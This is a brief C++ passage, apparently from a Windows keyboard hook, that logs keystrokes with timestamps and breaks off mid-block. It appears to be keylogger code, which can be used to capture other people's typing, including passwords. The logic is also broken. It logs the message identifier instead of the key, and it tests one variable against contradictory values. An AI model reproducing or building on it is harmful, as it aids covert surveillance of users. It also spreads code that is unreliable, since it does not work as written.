    if (wParam == WM_KEYDOWN) {
        logKeystroke(static_cast<unsigned char>(wParam), time(NULL));
    } else if (wParam == WM_KEYUP) {
        // Check if Shift, Ctrl, or Alt is pressed
        if ((wParam == VK_SHIFT) || (wParam == VK_CONTROL) || (wParam == VK_MENU)) {
            logKeystroke(static_cast<unsigned char>(wParam), time(NULL));
